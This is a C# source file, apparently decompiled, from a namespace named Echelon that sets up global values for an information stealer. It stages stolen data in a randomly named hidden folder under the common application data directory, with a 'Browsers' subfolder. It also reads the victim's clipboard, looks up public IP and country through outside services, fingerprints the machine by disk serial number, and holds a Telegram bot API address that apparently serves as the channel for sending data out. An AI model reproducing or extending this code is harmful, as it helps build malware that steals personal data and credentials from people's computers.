using System;
using System.Management;
using System.Net;
using System.Windows;
using System.Xml;

namespace Echelon
{
	public class Global
	{
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		public static readonly string GeoIpURL = "http://ip-api.com/xml";

		public static string dir = CommonData + "\\" + j.a() + ".tmp";

		public static string Echelon_Dir = dir + "\\" + j.a();

		public static string Browsers = Echelon_Dir + "\\Browsers";

		public static string ApiUrl = "https://api.telegram.org/bot";

		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm:ss tt");

		public static string DateLog = DateTime.Now.ToString("MMddyyyy");

		public static string IP = new WebClient().DownloadString("https://api.ipify.org/");

		public static string ClipBoard = Clipboard.GetText();

		public static string CountryCOde()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText + "]";
		}

		public static string Country()
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.LoadXml(new WebClient().DownloadString(GeoIpURL));
			return "[" + xmlDocument.GetElementsByTagName("country")[0].InnerText + "]";
		}

		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
				return result;
			}
			catch
			{
				return result;
			}
		}
	}
}
